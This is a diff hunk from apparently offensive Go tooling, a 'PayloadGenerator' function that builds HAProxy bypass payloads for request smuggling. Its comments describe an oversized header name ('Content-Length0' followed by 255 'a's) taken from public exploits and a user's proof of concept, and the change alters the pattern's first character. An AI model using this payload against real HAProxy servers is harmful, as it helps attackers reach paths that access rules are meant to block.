@@ -51,7 +51,7 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 	// 217 'a' characters is what's used in the public exploits
 	// User has indicated their specific PoC uses a header name (Content-Length0...:) that totals 271 chars,
 	// implying 255 'a's after "Content-Length0".
-	overflowPattern := "0" + strings.Repeat("a", 255)
+	overflowPattern := "b" + strings.Repeat("a", 255)
 
 	// For each public path, try to smuggle a request to the target path
 	for _, publicPath := range publicPaths {
